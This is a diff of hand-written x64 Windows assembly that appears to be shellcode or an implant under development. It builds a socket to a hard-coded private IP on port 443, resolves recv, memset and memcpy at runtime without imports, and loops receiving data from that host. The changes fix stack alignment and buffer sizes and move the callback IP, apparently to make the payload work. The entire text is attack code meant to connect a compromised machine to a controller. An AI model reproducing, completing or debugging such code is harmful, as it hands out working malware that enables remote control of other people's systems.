@@ -167,7 +167,7 @@ WinMain:
                 mov [rsp], rax;                    # AF_INET = 2
                 mov rax, 0xbb01;                   # PORT
                 mov [rsp+2], rax;                  # PORT
-                mov rax, 0x9700000a;               # IP
+                mov rax, 0xc000000a;               # IP
                 mov [rsp+4],rax;                   # IP
                 lea rdx,[rsp];                     # Save our pointer to RDX
                 mov r8,0x10;                       # Move 0x10 namelen
@@ -194,19 +194,18 @@ WinMain:
                 sub rsp, 0x30
                 call r14
                 mov r12,rax
+                add rsp, 0x30
         ; Call memset
                 mov r8d, 0x400
                 mov edx, 0
-                sub rsp, 0x400
+                sub rsp, 0x1000
                 lea rcx, [rsp]
                 call r12
                 xor r8,r8
                 lea r8, [rax] 
-
+                add rsp, 0x1000
         ;Lookup recv
         LoopRecv:
-                add rsp,0x208
-                sub rsp, 0x208
                 xor rcx,rcx
                 xor rax,rax
                 mov rax, 0x76636572FFFFFFFF
@@ -214,9 +213,9 @@ WinMain:
                 push rax
                 mov rdx,rsp
                 mov rcx, r15 
-                xor r10,r10
-                push r10
+                sub rsp, 0x30
                 call r14 
+                sub rsp, 0x30
                 mov r12, rax
 
         
@@ -224,13 +223,12 @@ WinMain:
                 mov rcx, r13
                 xor r9,r9
                 mov r8d, 0x400
-                sub rsp, 0x2728
+                sub rsp, 0x1000
                 lea rdx, [rsp]
-                push byte 8
-                pop r8
                 mov r10, 0x00
                 push r10
                 call r12
+                add rsp, 0x08
                 xor rdi,rdi
                 xor rsi,rsi
         
@@ -239,27 +237,26 @@ WinMain:
                 jne Continue
                 jmp Loop
         
-        Continue:
-                add rsp, 0x208        
+        Continue:        
                 cmp al, 0x01
                 jz LoopRecv
                 cmp al, 0x02
                 jz LoopRecv                
-                ;call CaractereNull
-                sub rsp, 0x208
-                call CaractereNull
                 mov rdi, rax
                 call Locate_ntdll
-                xor rax, rax
-                mov al, 0x00
+                xor rbp, rbp
+                mov rbp, 0x00
 
-                loopcaractere:        
-                        inc al
-                        inc rsp
-                        cmp al, 0x08 
-                        jnz loopcaractere     
+                ;loopcaractere:        
+                ;        inc rbp
+                ;        inc rsp
+                ;        cmp rbp, 0x08 
+                ;        jnz loopcaractere     
                 mov rsi ,rsp
+
+                call CaractereNull
                 
+                mov rbx, r8
                 ; Lookup memcpy
                 memcpy:
                         xor rax,rax
@@ -307,7 +304,9 @@ WinMain:
                         mov r9, 0x00
                         push r9
                         call r12
-                        add rsp, 0x208
+                        add rsp, 0x2728
+                        add rsp, 0x1000
+                        add rsp, 0x08
                         cmp al,0
                         jnz LoopRcv
                 
@@ -431,11 +430,10 @@ WinMain:
                         xor rcx,rcx
                         lea rcx, [rsp-0x2c-0x12]
                         sub rsp, 0x80
-                        xor r10,r10
-                        push r10
+                        sub rsp, 0x30
                         call r12
                         add rsp, 0x80
-                        add rsp, 0x208
+                        sub rsp, 0x80
                 LoopRcv:
                 ; LoopRecv
                         xor rcx,rcx
@@ -475,11 +473,10 @@ WinMain:
         
         ; Caractere Nulo
         CaractereNull:
-                xor rdi,rdi
-                mov dl,0x00
-                mov [rsp+rax],dl
-                mov [rsp+rax+0x1], dl
-                mov [rsp+rax+0x02], dl
+                xor rbx,rbx
+
+                mov [rsp+rdi*0x02], bl
+                mov [rsp+rdi*0x02+0x01], bl
         ret                                      
 
         LoadLibrary:        
